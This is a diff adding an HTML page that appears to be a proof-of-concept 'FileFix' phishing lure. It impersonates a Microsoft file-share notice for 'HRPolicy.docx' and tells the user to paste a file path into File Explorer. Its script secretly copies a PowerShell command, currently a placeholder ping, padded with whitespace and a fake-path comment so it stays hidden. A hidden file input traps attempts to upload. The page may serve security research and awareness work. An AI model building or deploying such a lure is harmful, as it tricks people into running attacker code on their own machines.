@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<head>
+  <title>mr.d0x shared a file with you</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 40px 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #ffffff;
+      width: 560px;
+      border-radius: 6px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      border: 1px solid #dcdcdc;
+      text-align: center;
+    }
+
+    .header {
+      padding: 40px 30px 10px;
+    }
+
+    .header img {
+      width: 36px;
+      margin-bottom: 25px;
+    }
+
+    .header h2 {
+      font-size: 20px;
+      color: #2f2f2f;
+      margin: 0;
+    }
+
+    .timestamp {
+      font-size: 13px;
+      color: #7a7a7a;
+      margin-top: 6px;
+    }
+
+    .instructions {
+      text-align: left;
+      padding: 25px 40px 10px;
+      font-size: 15px;
+      color: #333333;
+      line-height: 1.6;
+    }
+
+    .instructions ol {
+      margin: 0;
+      padding-left: 20px;
+    }
+
+    .code-block {
+    background-color: #f1f1f1;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    padding: 8px 12px;
+    font-family: Consolas, monospace;
+    font-size: 14px;
+    margin-top: 8px;
+    position: relative;
+    transition: background-color 0.3s;
+    cursor: pointer;
+    user-select: none;
+    }
+
+
+    .code-block:hover {
+      background-color: #e6e6e6;
+    }
+
+    .code-block::after {
+      content: "Copy";
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #0078d4;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .code-block:hover::after {
+      opacity: 1;
+    }
+
+    .code-block.clicked::after {
+      content: "Copied";
+      color: #107c10;
+    }
+
+    #fileExplorer {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      font-size: 15px;
+      border-radius: 4px;
+      margin: 30px 0 40px;
+      cursor: pointer;
+    }
+
+    #fileExplorer:hover {
+      background-color: #005ea2;
+    }
+
+    .footer {
+      font-size: 11.5px;
+      color: #6b6b6b;
+      background-color: #f7f7f7;
+      padding: 12px 24px;
+      border-top: 1px solid #dcdcdc;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer img {
+      height: 16px;
+    }
+
+    .footer a {
+      color: #6b6b6b;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header">
+      <svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"></path>
+      </svg>
+      <h2>mr.d0x made "HRPolicy.docx" available to you</h2>
+      <div class="timestamp">06/20/2025 10:22:45 AM</div>
+    </div>
+
+    <div class="instructions">
+      <p>To access <strong>HRPolicy.docx</strong>, follow these steps:</p>
+      <ol>
+        <li style="margin-bottom: 10px;">
+          Copy the file path below
+          <div class="code-block" id="path" onclick="this.classList.add('clicked')">
+            C:\company\internal-secure\filedrive\HRPolicy.docx
+          </div>
+        </li>
+        <li style="margin-bottom: 10px;">Open File Explorer and select the address bar (<strong>CTRL + L</strong>)</li>
+        <li style="margin-bottom: 10px;">Paste the file path and press <strong>Enter</strong></li>
+      </ol>
+    </div>
+
+    <input type="file" id="fileInput" style="display: none;">
+    <button id="fileExplorer">Open File Explorer</button>
+
+    <div class="footer">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+    </div>
+  </div>
+    <script>
+    const fileInput = document.getElementById('fileInput');
+    const fileExplorer = document.getElementById('fileExplorer');
+    const path = document.getElementById('path');
+
+    // Copy the powershell command if they click on the dummy file path
+    // In case the user tries to be smart and open file explorer manually
+    path.addEventListener('click', function() {
+        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
+    });
+
+    // Copy powershell command & open file explorer
+    fileExplorer.addEventListener('click', function() {
+        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
+
+      fileInput.click();
+    });
+
+  // Block any attempted file uploads
+  fileInput.addEventListener('change', () => {
+    alert("Please follow the stated instructions.");
+    fileInput.value = "";
+    setTimeout(() => fileInput.click(), 500);
+});
+  </script>
+</body>
+</html>
